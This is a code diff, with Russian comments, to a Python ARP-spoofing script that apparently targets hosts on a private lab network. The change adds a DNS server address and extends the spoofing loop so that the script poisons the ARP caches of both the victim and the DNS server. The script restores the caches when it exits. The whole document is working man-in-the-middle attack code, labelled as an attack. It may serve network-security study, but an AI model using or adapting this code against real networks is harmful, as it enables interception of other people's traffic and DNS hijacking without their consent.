@@ -10,6 +10,8 @@ VICTIM_IP = "172.28.0.10" # хост, которого обманываем
 TARGET_IP = "172.28.0.20" # хост, которым притворяемся
 INTERFACE = "eth0" # сетевой интерфейс, через который работаем
 INTERFACE_MAC = None # mac сетевого интерфейса
+DNS_IP = "172.28.0.53"
+
 
 running = True
 
@@ -92,6 +94,9 @@ def arp_spoof():
     target_mac = get_mac(TARGET_IP)
     print(f"цель: {TARGET_IP} -> {target_mac}")
 
+    dns_mac = get_mac(DNS_IP)
+    print(f"MAC DNS: {dns_mac}")
+
     # ======== атака ========   
     if not victim_mac or not target_mac:
         print("не удалось найти MAС-адреса!!!!!!!")
@@ -103,10 +108,21 @@ def arp_spoof():
         while running:
             spoof(VICTIM_IP, victim_mac, TARGET_IP) # притворяемя целью
             spoof(TARGET_IP, target_mac, VICTIM_IP) # притворяемя жертвой
+
+            # Спуфинг DNS
+            if dns_mac:
+                spoof(VICTIM_IP, victim_mac, DNS_IP)
+                spoof(DNS_IP, dns_mac, VICTIM_IP)
+
             time.sleep(2)
+
     finally:
         restore_cache(VICTIM_IP, victim_mac, TARGET_IP, target_mac)
         restore_cache(TARGET_IP, target_mac, VICTIM_IP, victim_mac)
+
+        if dns_mac:
+            restore_cache(VICTIM_IP, victim_mac, DNS_IP, dns_mac)
+            restore_cache(DNS_IP, dns_mac, VICTIM_IP, victim_mac)
         print("ARP восстановлен")
 
 if __name__ == "__main__":
